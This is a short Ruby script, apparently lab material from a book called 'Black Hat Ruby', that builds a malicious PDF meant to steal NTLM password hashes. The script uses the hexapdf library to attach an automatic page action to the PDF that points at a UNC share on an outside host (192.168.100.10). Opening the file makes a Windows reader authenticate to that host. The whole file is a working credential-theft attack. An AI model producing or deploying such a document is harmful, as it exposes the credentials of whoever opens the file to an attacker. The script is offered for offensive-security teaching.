#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Bad-PDF create a PDF that steal NTLM hash 
# Requirements:
#   gem install hexapdf
#
require 'hexapdf'

doc = HexaPDF::Document.new
doc.pages.add
canvas = doc.pages.add.canvas
canvas.font('Helvetica', size: 48)
canvas.text("Black Hat Ruby", at: [0, 500])

doc.pages[0][:AA] = {
  O: {
    Type: :Action,
    F: "\\\\192.168.100.10\\puppy",
    S: :GoToE,
    D: [doc.pages[0], :Fit],
  }
}
doc.write("bhr-ntlm.pdf")
